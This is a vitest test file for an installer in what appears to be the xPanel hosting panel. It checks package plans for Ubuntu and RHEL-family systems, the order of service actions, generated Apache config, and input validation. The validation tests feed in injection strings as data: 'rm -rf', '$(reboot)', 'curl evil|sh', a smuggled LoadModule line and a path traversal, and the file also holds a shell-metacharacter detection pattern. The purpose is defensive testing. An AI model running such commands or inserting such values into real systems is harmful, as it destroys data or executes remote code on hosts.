import { describe, expect, it } from 'vitest'
import { XpanelError } from '@xpanel/core'
import type { ApacheMpm } from '@xpanel/core'
import { profileFor } from './detect.ts'
import {
  INSTALL_PHASES,
  ONDREJ_PHP_PPA,
  REQUIRED_CGROUP_CONTROLLERS,
  REQUIRED_QUOTA_TOOLS,
  apacheMpmActions,
  apacheMpmFiles,
  installBundle,
  installFiles,
  installPhaseJournal,
  installPlan,
  installWarnings,
  phpInstallPlan,
  resolveInstallOptions,
  resolveOptInServices,
  runUnifiedInstaller,
  verifyInstallPreflight,
} from './install.ts'
import type { InstallerExecutionHost, PreflightHostProbe, VirtualFileEntry } from './install-runner.ts'
import type { InstallAction, InstallOptions, XpanelOsProfile } from './types.ts'
import { SAFE_ARG, assertUnitName } from './validate.ts'
import { ALMA_10, ALMA_9, CENTOS_STREAM_10, CENTOS_STREAM_9, ROCKY_10, ROCKY_9, SUPPORTED_FIXTURES, UBUNTU_2204, UBUNTU_2404 } from './fixtures.ts'

const error = (fn: () => unknown): XpanelError => {
  try {
    fn()
  } catch (e) {
    if (e instanceof XpanelError) return e
    throw e
  }
  throw new Error('expected an XpanelError')
}

const full: InstallOptions = { engine: 'apache', phpVersions: ['8.3'], withMail: true, withDns: true, withFtp: true }
const execs = (plan: InstallAction[]): string[][] => plan.flatMap(a => (a.kind === 'exec' ? [a.argv] : []))
const installed = (plan: InstallAction[]): string[] => execs(plan).filter(a => a.includes('install')).flatMap(a => a)
const unitsFor = (plan: InstallAction[], verb: string): string[] =>
  plan.flatMap(a => (a.kind === 'systemd' && a.verb === verb ? [a.unit] : []))
const indexOf = (plan: InstallAction[], pred: (a: InstallAction) => boolean): number => {
  const i = plan.findIndex(pred)
  expect(i).toBeGreaterThanOrEqual(0)
  return i
}
const execWith = (...parts: string[]) => (a: InstallAction): boolean => a.kind === 'exec' && parts.every(p => a.argv.includes(p))
const unitAction = (verb: string, unit: string) => (a: InstallAction): boolean => a.kind === 'systemd' && a.verb === verb && a.unit === unit

const ubuntu24 = profileFor(UBUNTU_2404)
const ubuntu22 = profileFor(UBUNTU_2204)
const centos9 = profileFor(CENTOS_STREAM_9)
const centos10 = profileFor(CENTOS_STREAM_10)
const EL: XpanelOsProfile[] = [centos9, centos10, profileFor(ALMA_9), profileFor(ALMA_10), profileFor(ROCKY_9), profileFor(ROCKY_10)]

describe('acceptance: CentOS adapter returns httpd and PHP names in a dry run', () => {
  it('plans httpd and php83-php-fpm for CentOS Stream 9', () => {
    const plan = installPlan(centos9, { ...full, apacheMpm: 'prefork' })
    const pkgs = installed(plan)
    expect(pkgs).toContain('httpd')
    expect(pkgs).toContain('php83-php-fpm')
    expect(pkgs).not.toContain('apache2')
    expect(centos9.services.apache).toBe('httpd')
    expect(unitsFor(plan, 'enable')).toContain('httpd')
    expect(unitsFor(plan, 'stop')).toContain('php83-php-fpm')
  })
})

describe('Ubuntu install plan', () => {
  const plan = installPlan(ubuntu24, full)
  const pkgs = installed(plan)

  it('installs apache2 with mpm_itk and side-by-side PHP 8.3', () => {
    for (const p of ['apache2', 'libapache2-mpm-itk', 'apache2-suexec-custom', 'libapache2-mod-fcgid', 'php8.3-fpm', 'php8.3-cli', 'nginx']) {
      expect(pkgs).toContain(p)
    }
    for (const p of ['mariadb-server', 'postgresql', 'redis-server', 'nftables', 'quota', 'certbot', 'openssh-server']) expect(pkgs).toContain(p)
    for (const p of ['postfix', 'dovecot-imapd', 'dovecot-pop3d', 'dovecot-lmtpd', 'pdns-server', 'pdns-backend-pgsql', 'pure-ftpd']) {
      expect(pkgs).toContain(p)
    }
    expect(pkgs).not.toContain('httpd')
  })

  it('uses non-interactive apt-get without recommends', () => {
    const installs = execs(plan).filter(a => a.includes('install') && a.includes('/usr/bin/apt-get'))
    expect(installs.length).toBeGreaterThan(0)
    for (const a of installs) {
      expect(a.slice(0, 4)).toEqual(['/usr/bin/env', 'DEBIAN_FRONTEND=noninteractive', 'NEEDRESTART_MODE=l', '/usr/bin/apt-get'])
      expect(a).toContain('-y')
      expect(a).toContain('--no-install-recommends')
      expect(a).toContain('Dpkg::Options::=--force-confold')
      // a fresh cloud host runs unattended-upgrades right after boot
      expect(a[a.indexOf('DPkg::Lock::Timeout=600') - 1]).toBe('-o')
    }
  })

  it('keeps needrestart from restarting services on its own', () => {
    const apt = execs(plan).filter(a => a.includes('/usr/bin/apt-get'))
    expect(apt.length).toBeGreaterThan(2)
    for (const a of apt) expect(a.indexOf('NEEDRESTART_MODE=l')).toBeLessThan(a.indexOf('/usr/bin/apt-get'))
  })

  it('adds universe and the ondrej PPA before installing PHP', () => {
    const ppa = indexOf(plan, execWith(ONDREJ_PHP_PPA))
    const universe = indexOf(plan, execWith('universe'))
    const php = indexOf(plan, execWith('php8.3-fpm'))
    const update = plan.findIndex((a, i) => i > ppa && execWith('update')(a))
    expect(universe).toBeLessThan(php)
    expect(ppa).toBeLessThan(update)
    expect(update).toBeLessThan(php)
    expect(indexOf(plan, execWith('software-properties-common'))).toBeLessThan(ppa)
  })

  it('stages nginx and apache2 so they never fight over :80', () => {
    const nginxInstall = indexOf(plan, execWith('nginx', 'install'))
    const nginxStop = indexOf(plan, unitAction('stop', 'nginx'))
    const apacheInstall = indexOf(plan, execWith('apache2', 'install'))
    const apacheStop = indexOf(plan, unitAction('stop', 'apache2'))
    expect(nginxInstall).toBeLessThan(nginxStop)
    expect(nginxStop).toBeLessThan(apacheInstall)
    expect(apacheInstall).toBeLessThan(apacheStop)
    expect(execs(plan)[nginxInstall]).not.toContain('apache2')
    expect(unitsFor(plan, 'start')).not.toContain('nginx')
    expect(unitsFor(plan, 'start')).not.toContain('apache2')
  })

  it('switches the MPM to itk after the packages are in', () => {
    const dis = indexOf(plan, execWith('/usr/sbin/a2dismod', 'mpm_event'))
    const prefork = indexOf(plan, execWith('/usr/sbin/a2enmod', 'mpm_prefork'))
    const itk = indexOf(plan, execWith('/usr/sbin/a2enmod', 'mpm_itk'))
    expect(indexOf(plan, execWith('libapache2-mpm-itk'))).toBeLessThan(dis)
    expect(dis).toBeLessThan(prefork)
    expect(prefork).toBeLessThan(itk)
    expect(indexOf(plan, execWith('/usr/sbin/a2enmod', 'proxy_fcgi', 'remoteip'))).toBeGreaterThan(itk)
  })

  it('keeps the distro FPM master off and enables the stack', () => {
    expect(unitsFor(plan, 'stop')).toContain('php8.3-fpm')
    expect(unitsFor(plan, 'disable')).toContain('php8.3-fpm')
    expect(unitsFor(plan, 'enable')).toEqual(['nginx', 'apache2', 'mariadb', 'postgresql', 'redis-server', 'nftables', 'postfix', 'dovecot', 'pdns', 'pure-ftpd'])
    expect(unitsFor(plan, 'start')).toEqual(['mariadb', 'postgresql', 'redis-server'])
  })

  it('never touches sshd or starts nftables', () => {
    for (const verb of ['start', 'stop', 'restart', 'reload', 'enable', 'disable']) {
      expect(unitsFor(plan, verb)).not.toContain('ssh')
      expect(unitsFor(plan, verb)).not.toContain('ssh.socket')
    }
    expect(unitsFor(plan, 'start')).not.toContain('nftables')
  })

  it('installs each package once', () => {
    const names = execs(plan).filter(a => a.includes('install')).flatMap(a => a.slice(a.indexOf('--no-install-recommends') + 1))
    expect(new Set(names).size).toBe(names.length)
  })

  it('omits itk when prefork is chosen explicitly', () => {
    const p = installPlan(ubuntu22, { ...full, apacheMpm: 'prefork' })
    expect(installed(p)).not.toContain('libapache2-mpm-itk')
    expect(p.some(execWith('mpm_itk'))).toBe(false)
    expect(p.some(execWith('/usr/sbin/a2enmod', 'mpm_prefork'))).toBe(true)
  })
})

describe('RHEL install plan', () => {
  it('rejects the itk engine with ENGINE_UNAVAILABLE on every EL release', () => {
    for (const p of EL) {
      const e = error(() => installPlan(p, full))
      expect(e.code).toBe('ENGINE_UNAVAILABLE')
      expect(e.status).toBe(409)
      expect(e.detail.apacheMpm).toBe('itk')
      expect(error(() => installPlan(p, { ...full, apacheMpm: 'itk' })).code).toBe('ENGINE_UNAVAILABLE')
      expect(error(() => apacheMpmActions(p, 'itk')).code).toBe('ENGINE_UNAVAILABLE')
      expect(error(() => apacheMpmFiles(p, 'itk')).code).toBe('ENGINE_UNAVAILABLE')
      expect(error(() => installFiles(p, full)).code).toBe('ENGINE_UNAVAILABLE')
    }
  })

  it('enables CRB, then EPEL, then Remi, then installs', () => {
    const plan = installPlan(centos9, { ...full, apacheMpm: 'prefork' })
    const core = indexOf(plan, execWith('dnf-plugins-core'))
    const crb = indexOf(plan, execWith('config-manager', '--set-enabled', 'crb'))
    const epel = indexOf(plan, execWith('https://dl.fedoraproject.org/pub/epel/epel-release-latest-9.noarch.rpm'))
    const remi = indexOf(plan, execWith('https://rpms.remirepo.net/enterprise/remi-release-9.rpm'))
    const pkgs = indexOf(plan, execWith('httpd'))
    expect([core, crb, epel, remi, pkgs]).toEqual([...[core, crb, epel, remi, pkgs]].sort((a, b) => a - b))
    expect(execs(plan)[epel]).toContain('https://dl.fedoraproject.org/pub/epel/epel-next-release-latest-9.noarch.rpm')
  })

  it('uses the right EPEL source per distribution and Remi per major', () => {
    const c10 = installPlan(centos10, { ...full, apacheMpm: 'prefork' })
    expect(c10.some(execWith('https://dl.fedoraproject.org/pub/epel/epel-release-latest-10.noarch.rpm'))).toBe(true)
    expect(c10.some(a => a.kind === 'exec' && a.argv.some(x => x.includes('epel-next')))).toBe(false)
    expect(c10.some(execWith('https://rpms.remirepo.net/enterprise/remi-release-10.rpm'))).toBe(true)
    for (const p of [profileFor(ALMA_9), profileFor(ROCKY_10)]) {
      const plan = installPlan(p, { ...full, apacheMpm: 'prefork' })
      expect(plan.some(execWith('/usr/bin/dnf', 'install', 'epel-release'))).toBe(true)
      expect(plan.some(a => a.kind === 'exec' && a.argv.some(x => x.includes('dl.fedoraproject.org')))).toBe(false)
    }
  })

  it('installs one dnf transaction with EL package names', () => {
    const plan = installPlan(centos10, { ...full, apacheMpm: 'prefork' })
    const tx = execs(plan).filter(a => a.includes('httpd'))
    expect(tx).toHaveLength(1)
    const pkgs = tx[0]!
    expect(pkgs.slice(0, 4)).toEqual(['/usr/bin/dnf', 'install', '-y', '--setopt=install_weak_deps=False'])
    for (const p of ['nginx', 'httpd', 'mod_ssl', 'mod_fcgid', 'mariadb-server', 'postgresql-server', 'valkey', 'postfix', 'dovecot', 'pdns', 'pdns-backend-postgresql', 'pure-ftpd', 'certbot', 'php83-php-fpm']) {
      expect(pkgs).toContain(p)
    }
    expect(new Set(pkgs).size).toBe(pkgs.length)
  })

  it('initialises PostgreSQL once, guarded, before starting it', () => {
    const plan = installPlan(centos9, { ...full, apacheMpm: 'prefork' })
    const initdb = indexOf(plan, execWith('/usr/bin/postgresql-setup', '--initdb'))
    const action = plan[initdb]!
    expect(action.kind === 'exec' && action.creates).toBe('/var/lib/pgsql/data/PG_VERSION')
    expect(initdb).toBeLessThan(indexOf(plan, unitAction('start', 'postgresql')))
    expect(installPlan(ubuntu24, full).some(execWith('--initdb'))).toBe(false)
  })

  it('enables RHEL unit names', () => {
    expect(unitsFor(installPlan(centos9, { ...full, apacheMpm: 'prefork' }), 'enable')).toEqual(
      ['nginx', 'httpd', 'mariadb', 'postgresql', 'redis', 'nftables', 'postfix', 'dovecot', 'pdns', 'pure-ftpd'],
    )
    expect(unitsFor(installPlan(centos10, { ...full, apacheMpm: 'prefork' }), 'start')).toEqual(['mariadb', 'postgresql', 'valkey'])
  })

  it('selects prefork through 00-mpm.conf, not a command', () => {
    expect(apacheMpmActions(centos9, 'prefork')).toEqual([])
    const [file] = installFiles(centos9, { ...full, apacheMpm: 'prefork' })
    expect(file!.path).toBe('/etc/httpd/conf.modules.d/00-mpm.conf')
    expect(file!.content).toContain('LoadModule mpm_prefork_module modules/mod_mpm_prefork.so')
    expect(file!.content).not.toMatch(/^LoadModule mpm_event/m)
    expect(file!.mode).toBe(0o644)
  })
})

describe('optional services and engines', () => {
  it('leaves mail, DNS and FTP out unless asked', () => {
    const plan = installPlan(ubuntu24, { engine: 'apache', phpVersions: ['8.3'], withMail: false, withDns: false, withFtp: false })
    const pkgs = installed(plan)
    for (const p of ['postfix', 'dovecot-imapd', 'pdns-server', 'pure-ftpd']) expect(pkgs).not.toContain(p)
    for (const u of ['postfix', 'dovecot', 'pdns', 'pure-ftpd']) expect(unitsFor(plan, 'enable')).not.toContain(u)
  })

  it('adds each toggle on its own', () => {
    const base = { engine: 'apache' as const, phpVersions: [], withMail: false, withDns: false, withFtp: false }
    expect(installed(installPlan(ubuntu24, { ...base, withDns: true }))).toContain('pdns-backend-pgsql')
    expect(installed(installPlan(ubuntu24, { ...base, withDns: true }))).not.toContain('postfix')
    expect(installed(installPlan(ubuntu24, { ...base, withFtp: true }))).toContain('pure-ftpd')
    expect(installed(installPlan(ubuntu24, { ...base, withMail: true }))).toContain('dovecot-lmtpd')
  })

  it('installs ModSecurity only on request', () => {
    expect(installed(installPlan(ubuntu24, full))).not.toContain('libapache2-mod-security2')
    expect(installed(installPlan(ubuntu24, { ...full, withModSecurity: true }))).toContain('libapache2-mod-security2')
    expect(installed(installPlan(centos9, { ...full, apacheMpm: 'prefork', withModSecurity: true }))).toContain('mod_security')
  })

  it('skips PHP repositories when no PHP version is requested', () => {
    const deb = installPlan(ubuntu24, { ...full, phpVersions: [] })
    expect(deb.some(execWith(ONDREJ_PHP_PPA))).toBe(false)
    expect(installed(deb).some(p => p.startsWith('php'))).toBe(false)
    const el = installPlan(centos9, { ...full, apacheMpm: 'prefork', phpVersions: [] })
    expect(el.some(a => a.kind === 'exec' && a.argv.some(x => x.includes('remirepo')))).toBe(false)
  })

  it('installs several PHP versions side by side', () => {
    const plan = installPlan(ubuntu24, { ...full, phpVersions: ['7.4', '8.1', '8.4'] })
    for (const p of ['php7.4-fpm', 'php7.4-json', 'php8.1-fpm', 'php8.4-fpm']) expect(installed(plan)).toContain(p)
    expect(unitsFor(plan, 'disable')).toEqual(['php7.4-fpm', 'php8.1-fpm', 'php8.4-fpm'])
  })

  it('reports OpenLiteSpeed as unavailable on both families', () => {
    for (const p of [ubuntu24, centos9]) {
      const e = error(() => installPlan(p, { ...full, engine: 'openlitespeed' }))
      expect(e.code).toBe('ENGINE_UNAVAILABLE')
      expect(e.detail.engine).toBe('openlitespeed')
    }
  })
})

describe('hostile input', () => {
  const bad: [string, unknown][] = [
    ['php injection', { ...full, phpVersions: ['8.3; rm -rf'] }],
    ['php command substitution', { ...full, phpVersions: ['$(reboot)'] }],
    ['php duplicates', { ...full, phpVersions: ['8.3', '8.3'] }],
    ['php not an array', { ...full, phpVersions: '8.3' }],
    ['unknown engine', { ...full, engine: 'nginx' }],
    ['engine injection', { ...full, engine: 'apache; id' }],
    ['bad mpm', { ...full, apacheMpm: 'worker' }],
    ['null mpm', { ...full, apacheMpm: null }],
    ['string boolean', { ...full, withMail: 'yes' }],
    ['missing boolean', { engine: 'apache', phpVersions: [], withMail: true, withDns: true }],
    ['bad modsecurity flag', { ...full, withModSecurity: 1 }],
    ['unknown key', { ...full, packages: ['netcat'] }],
    ['prototype key', JSON.parse('{"engine":"apache","phpVersions":[],"withMail":true,"withDns":true,"withFtp":true,"__proto__":{"x":1}}')],
    ['null', null],
    ['array', [full]],
    ['class instance', Object.assign(Object.create({ evil: true }), full)],
  ]
  for (const [name, options] of bad) {
    it(`rejects ${name} with VALIDATION`, () => {
      expect(error(() => installPlan(ubuntu24, options as InstallOptions)).code).toBe('VALIDATION')
      expect(error(() => resolveInstallOptions(options)).code).toBe('VALIDATION')
    })
  }

  it('rejects a forged profile', () => {
    expect(error(() => installPlan({ ...ubuntu24, packageManager: 'dnf' } as XpanelOsProfile, full)).code).toBe('UNSUPPORTED_OS')
    expect(error(() => installPlan(null as never, full)).code).toBe('UNSUPPORTED_OS')
  })

  it('rejects poisoned package names inside a forged profile', () => {
    const forged = { ...ubuntu24, packages: { ...ubuntu24.packages, nginx: ['nginx;curl evil|sh'] } } as XpanelOsProfile
    expect(error(() => installPlan(forged, full)).code).toBe('VALIDATION')
    const optionInjection = { ...centos9, packages: { ...centos9.packages, nginx: ['--nogpgcheck'] } } as XpanelOsProfile
    expect(error(() => installPlan(optionInjection, { ...full, apacheMpm: 'prefork' })).code).toBe('VALIDATION')
    const badUnit = { ...ubuntu24, services: { ...ubuntu24.services, nginx: 'nginx; reboot' } } as XpanelOsProfile
    expect(error(() => installPlan(badUnit, full)).code).toBe('VALIDATION')
  })

  it('does not mutate the options it is given', () => {
    const options: InstallOptions = { ...full, phpVersions: ['8.3', '7.4'] }
    const snapshot = JSON.stringify(options)
    installBundle(ubuntu24, options)
    expect(JSON.stringify(options)).toBe(snapshot)
  })

  it('is deterministic', () => {
    expect(installPlan(ubuntu24, full)).toEqual(installPlan(ubuntu24, full))
    expect(installPlan(centos9, { ...full, apacheMpm: 'prefork' })).toEqual(installPlan(centos9, { ...full, apacheMpm: 'prefork' }))
  })
})

describe('argv never contains shell metacharacters', () => {
  const METACHARS = /[\s;&|<>$`\\'"*?()[\]{}!#~]/
  const mpms: ApacheMpm[] = ['itk', 'prefork']
  const phpSets = [[], ['8.3'], ['7.4', '8.0', '8.1', '8.2', '8.3', '8.4']]

  for (const [name, text] of Object.entries(SUPPORTED_FIXTURES)) {
    it(`${name}: every plan variant`, () => {
      const profile = profileFor(text)
      let checked = 0
      for (const apacheMpm of mpms) {
        for (const phpVersions of phpSets) {
          for (const flags of [0, 1, 2, 3, 4, 5, 6, 7, 8, 15]) {
            const options: InstallOptions = {
              engine: 'apache', phpVersions, apacheMpm,
              withMail: (flags & 1) > 0, withDns: (flags & 2) > 0, withFtp: (flags & 4) > 0, withModSecurity: (flags & 8) > 0,
            }
            if (apacheMpm === 'itk' && profile.family === 'rhel') continue
            const plans = [installPlan(profile, options), phpInstallPlan(profile, phpVersions)]
            for (const action of plans.flat()) {
              if (action.kind === 'systemd') {
                expect(assertUnitName(action.unit)).toBe(action.unit)
                continue
              }
              expect(action.kind).toBe('exec')
              if (action.kind !== 'exec') continue
              expect(action.argv[0]).toMatch(/^\//)
              for (const arg of action.argv) {
                expect(arg).toMatch(SAFE_ARG)
                expect(arg).not.toMatch(METACHARS)
                checked++
              }
            }
          }
        }
      }
      expect(checked).toBeGreaterThan(100)
    })
  }
})

describe('install files and warnings', () => {
  const none = { ...full, withMail: false, withDns: false, withFtp: false }
  const LISTEN = /^\s*Listen\b/im

  it('points apache2-suexec-custom at /home on Ubuntu', () => {
    const files = installFiles(ubuntu24, full)
    expect(files.find(f => f.path === '/etc/apache2/suexec/www-data'))
      .toEqual({ path: '/etc/apache2/suexec/www-data', content: '/home\npublic_html\n', mode: 0o644, owner: 'root', group: 'root' })
    expect(apacheMpmFiles(ubuntu24, 'itk')).toEqual([])
  })

  it('strips the distro Listen 80/443 so Apache can bind behind Nginx (Ubuntu)', () => {
    const ports = installFiles(ubuntu24, full).find(f => f.path === ubuntu24.paths.apachePortsConf)!
    expect(ports.path).toBe('/etc/apache2/ports.conf')
    expect(ports.content).not.toMatch(LISTEN)
    expect(ports.content).toContain('Managed by xPanel')
    expect(installFiles(ubuntu22, { ...full, apacheMpm: 'prefork' }).map(f => f.path))
      .toEqual(['/etc/apache2/ports.conf', '/etc/apache2/suexec/www-data'])
  })

  it('owns httpd.conf and ssl.conf on EL, with no Listen and no default vhost', () => {
    const files = installFiles(centos9, { ...full, apacheMpm: 'prefork' })
    expect(files.map(f => f.path)).toEqual([
      '/etc/httpd/conf.modules.d/00-mpm.conf',
      '/etc/httpd/conf/httpd.conf',
      '/etc/httpd/conf.d/ssl.conf',
      '/etc/httpd/conf.d/welcome.conf',
    ])
    for (const f of files) {
      expect(f.content).not.toMatch(LISTEN)
      expect(f.content).not.toMatch(/<VirtualHost/i)
      expect([f.mode, f.owner, f.group]).toEqual([0o644, 'root', 'root'])
      expect(f.content.endsWith('\n')).toBe(true)
    }
    const main = files[1]!.content
    expect(main).toContain('ServerRoot "/etc/httpd"')
    expect(main).toContain('Include "/etc/httpd/conf.modules.d/*.conf"')
    expect(main).toContain('IncludeOptional "/etc/httpd/conf.d/*.conf"')
    expect(main).toMatch(/^User apache$/m)
    expect(main).toMatch(/^Group apache$/m)
    expect(main).toContain('<Files ".ht*">\n    Require all denied\n</Files>')
    expect(main).toContain('<Directory />\n    AllowOverride None\n    Require all denied\n</Directory>')
    expect(main).toContain('LogFormat "%h %l %u %t \\"%r\\" %>s %b \\"%{Referer}i\\" \\"%{User-Agent}i\\"" combined')
    expect(main).toContain('ErrorLog "/var/log/httpd/error_log"')
    // the main file must not grant or alias anything account-facing on its own
    expect(main).not.toMatch(/ScriptAlias|Require all granted/)
    // mod_includes run after the module list, the vhost dir last
    expect(main.indexOf('conf.modules.d')).toBeLessThan(main.indexOf('IncludeOptional'))
    expect(files[2]!.content).toContain('SSLSessionCache shmcb:/run/httpd/sslcache(512000)')
  })

  it('writes the same file set on every EL release', () => {
    for (const p of EL) {
      expect(installFiles(p, { ...full, apacheMpm: 'prefork' }).map(f => f.path)).toEqual([
        `${p.paths.apacheModulesConf}/00-mpm.conf`, p.paths.apacheMainConf, p.paths.apacheSslConf, p.paths.apacheWelcomeConf,
      ])
    }
  })

  it('neutralises the EL test page that would answer every vhost without an index', () => {
    const welcome = installFiles(centos10, { ...full, apacheMpm: 'prefork' }).find(f => f.path === '/etc/httpd/conf.d/welcome.conf')!
    expect([welcome.mode, welcome.owner, welcome.group]).toEqual([0o644, 'root', 'root'])
    // comments only: no LocationMatch, Alias or ErrorDocument survives
    for (const line of welcome.content.trimEnd().split('\n')) expect(line).toMatch(/^# /)
    expect(installFiles(ubuntu24, full).some(f => f.path.endsWith('welcome.conf'))).toBe(false)
  })

  it('refuses a forged Apache user in the main config', () => {
    const forged = { ...centos9, paths: { ...centos9.paths, apacheUser: 'apache\nLoadModule evil_module /tmp/x.so' } } as XpanelOsProfile
    expect(error(() => installFiles(forged, { ...full, apacheMpm: 'prefork' })).code).toBe('VALIDATION')
    const badPath = { ...centos9, paths: { ...centos9.paths, apacheVhostDir: '/etc/httpd/conf.d" "/tmp' } } as XpanelOsProfile
    expect(error(() => installFiles(badPath, { ...full, apacheMpm: 'prefork' })).code).toBe('VALIDATION')
    const badWelcome = { ...centos9, paths: { ...centos9.paths, apacheWelcomeConf: '/etc/httpd/conf.d/../../shadow' } } as XpanelOsProfile
    expect(error(() => installFiles(badWelcome, { ...full, apacheMpm: 'prefork' })).code).toBe('VALIDATION')
  })

  it('warns about what the plan does not manage', () => {
    const codes = (p: XpanelOsProfile, o: InstallOptions) => installWarnings(p, o).map(w => w.code)
    expect(codes(ubuntu24, full)).toEqual(['EDGE_NOT_STARTED', 'SERVICES_NOT_STARTED', 'SSH_SOCKET_ACTIVATION', 'RESOLVED_STUB_PORT_53'])
    expect(codes(ubuntu22, none)).toEqual(['EDGE_NOT_STARTED'])
    expect(codes(centos9, { ...full, apacheMpm: 'prefork' })).toEqual(
      ['EDGE_NOT_STARTED', 'SERVICES_NOT_STARTED', 'APACHE_SHARED_IDENTITY', 'SELINUX_UNMANAGED', 'FIREWALLD_CONFLICT', 'SUEXEC_DOCROOT_FIXED'],
    )
    expect(installWarnings(ubuntu22, { ...full, apacheMpm: 'prefork' }).find(w => w.code === 'APACHE_SHARED_IDENTITY')!.message).toContain('www-data')
    expect(installWarnings(centos9, { ...full, apacheMpm: 'prefork' }).find(w => w.code === 'SERVICES_NOT_STARTED')!.message)
      .toContain('postfix, dovecot, pdns, pure-ftpd')
  })

  it('bundles actions, files and warnings consistently', () => {
    const b = installBundle(centos9, { ...full, apacheMpm: 'prefork' })
    expect(b.actions).toEqual(installPlan(centos9, { ...full, apacheMpm: 'prefork' }))
    expect(b.files).toEqual(installFiles(centos9, { ...full, apacheMpm: 'prefork' }))
    expect(b.files).toHaveLength(4)
    expect(b.warnings.length).toBeGreaterThan(0)
  })
})

describe('service state after install', () => {
  const OPTIONAL_DEB = ['postfix', 'dovecot', 'pdns', 'pure-ftpd']

  it('stops Debian mail, DNS and FTP daemons that their packages auto-start', () => {
    const plan = installPlan(ubuntu24, full)
    const lastInstall = plan.reduce((at, a, i) => (execWith('install', '--no-install-recommends')(a) ? i : at), -1)
    for (const unit of OPTIONAL_DEB) {
      const stop = indexOf(plan, unitAction('stop', unit))
      expect(stop).toBeGreaterThan(lastInstall)
      expect(stop).toBeLessThan(indexOf(plan, unitAction('enable', unit)))
    }
    expect(unitsFor(plan, 'start')).toEqual(['mariadb', 'postgresql', 'redis-server'])
  })

  it('only stops what was installed', () => {
    const plan = installPlan(ubuntu24, { ...full, withMail: false, withFtp: false })
    expect(unitsFor(plan, 'stop')).toEqual(['nginx', 'apache2', 'pdns', 'php8.3-fpm'])
  })

  it('leaves the same units running on both families', () => {
    const deb = installPlan(ubuntu24, full)
    const el = installPlan(centos9, { ...full, apacheMpm: 'prefork' })
    expect(unitsFor(el, 'start')).toEqual(['mariadb', 'postgresql', 'redis'])
    for (const unit of ['postfix', 'dovecot', 'pdns', 'pure-ftpd', 'nginx', 'httpd']) expect(unitsFor(el, 'start')).not.toContain(unit)
    expect(unitsFor(deb, 'enable')).toHaveLength(unitsFor(el, 'enable').length)
  })
})

describe('Debian web-server identities and modules', () => {
  const plan = installPlan(ubuntu24, full)

  it('creates the dedicated nginx system user idempotently, after adduser is present', () => {
    const add = indexOf(plan, execWith('/usr/sbin/adduser'))
    expect(execs(plan)[plan.slice(0, add + 1).filter(a => a.kind === 'exec').length - 1]).toEqual([
      '/usr/sbin/adduser', '--system', '--group', '--no-create-home', '--home', '/nonexistent', '--shell', '/usr/sbin/nologin', '--quiet', 'nginx',
    ])
    expect(indexOf(plan, execWith('adduser', 'install'))).toBeLessThan(add)
    expect(add).toBeLessThan(indexOf(plan, execWith('nginx', 'install')))
    expect(installPlan(centos9, { ...full, apacheMpm: 'prefork' }).some(execWith('--system'))).toBe(false)
  })

  it('rejects a forged system user name', () => {
    for (const bad of ['-o', 'root;id', 'Nginx', '', 'x'.repeat(40)]) {
      const forged = { ...ubuntu24, extraSystemUsers: [bad] } as XpanelOsProfile
      expect(error(() => installPlan(forged, full)).code).toBe('VALIDATION')
    }
  })

  it('enables every module the edge renderer can require', () => {
    const a2enmod = execs(plan).find(a => a[0] === '/usr/sbin/a2enmod' && a.includes('proxy_fcgi'))!
    for (const m of ['actions', 'cgi', 'suexec', 'fcgid', 'proxy', 'proxy_fcgi', 'remoteip', 'setenvif', 'rewrite', 'headers', 'alias', 'dir', 'mime', 'authz_core', 'authz_host']) {
      expect(a2enmod).toContain(m)
    }
    expect(a2enmod).not.toContain('mpm_event')
    expect(a2enmod).not.toContain('php8.3')
  })

  it('drops the server-wide /cgi-bin/ alias after the MPM switch', () => {
    const disconf = indexOf(plan, execWith('/usr/sbin/a2disconf', 'serve-cgi-bin'))
    expect(disconf).toBeGreaterThan(indexOf(plan, execWith('/usr/sbin/a2enmod', 'mpm_itk')))
  })

  it('turns off mod_status, whose /server-status trusts loopback clients every tenant can be', () => {
    const enable = indexOf(plan, execWith('/usr/sbin/a2enmod', 'proxy_fcgi'))
    const status = indexOf(plan, execWith('/usr/sbin/a2dismod', 'status'))
    expect(status).toBeGreaterThan(enable)
    expect(execs(plan)[plan.slice(0, status + 1).filter(a => a.kind === 'exec').length - 1]).toEqual(['/usr/sbin/a2dismod', 'status'])
    expect(execs(plan).some(a => a[0] === '/usr/sbin/a2enmod' && a.includes('status'))).toBe(false)
  })

  it('disables the stock 000-default vhost once Apache is installed', () => {
    const site = indexOf(plan, execWith('/usr/sbin/a2dissite', '000-default'))
    expect(site).toBeGreaterThan(indexOf(plan, execWith('apache2', 'install')))
    expect(installPlan(centos9, { ...full, apacheMpm: 'prefork' }).some(a => a.kind === 'exec' && a.argv[0]!.includes('/a2'))).toBe(false)
  })

  it('installs php-cgi for every PHP version, since the cgi, fcgid and suphp wrappers run it', () => {
    const p = installPlan(ubuntu24, { ...full, phpVersions: ['7.4', '8.3'] })
    expect(installed(p)).toEqual(expect.arrayContaining(['php7.4-cgi', 'php8.3-cgi']))
    expect(installed(phpInstallPlan(ubuntu22, ['8.4']))).toContain('php8.4-cgi')
  })

  it('fails closed when a Debian helper binary is missing from a forged profile', () => {
    for (const key of ['a2dismod', 'a2dissite', 'a2disconf'] as const) {
      const forged = { ...ubuntu24, bin: { ...ubuntu24.bin, [key]: null } } as XpanelOsProfile
      expect(error(() => installPlan(forged, full)).code).toBe('UNSUPPORTED_OS')
    }
    const relative = { ...ubuntu24, bin: { ...ubuntu24.bin, a2dissite: 'a2dissite' } } as XpanelOsProfile
    expect(error(() => installPlan(relative, full)).code).toBe('VALIDATION')
  })
})

describe('phpInstallPlan', () => {
  it('adds a PHP version without touching the web servers', () => {
    const plan = phpInstallPlan(ubuntu24, ['8.4'])
    expect(installed(plan)).toContain('php8.4-fpm')
    expect(plan.some(execWith(ONDREJ_PHP_PPA))).toBe(true)
    expect(unitsFor(plan, 'stop')).toEqual(['php8.4-fpm'])
    expect(plan.some(execWith('nginx'))).toBe(false)
  })

  it('pulls Remi on EL', () => {
    const plan = phpInstallPlan(centos9, ['8.2'])
    expect(plan.some(execWith('https://rpms.remirepo.net/enterprise/remi-release-9.rpm'))).toBe(true)
    expect(installed(plan)).toContain('php82-php-fpm')
  })

  it('validates versions', () => {
    expect(phpInstallPlan(ubuntu24, [])).toEqual([])
    expect(error(() => phpInstallPlan(ubuntu24, ['8.3; rm -rf'])).code).toBe('VALIDATION')
  })
})

describe('H02 unified preflight, opt-in services & durable install phase journal (A10, A26, A27, A28)', () => {
  const cleanProbe = (overrides: Partial<PreflightHostProbe> = {}): PreflightHostProbe => ({
    osReleaseText: UBUNTU_2404,
    detectedProfile: ubuntu24,
    cgroupControllers: [...REQUIRED_CGROUP_CONTROLLERS],
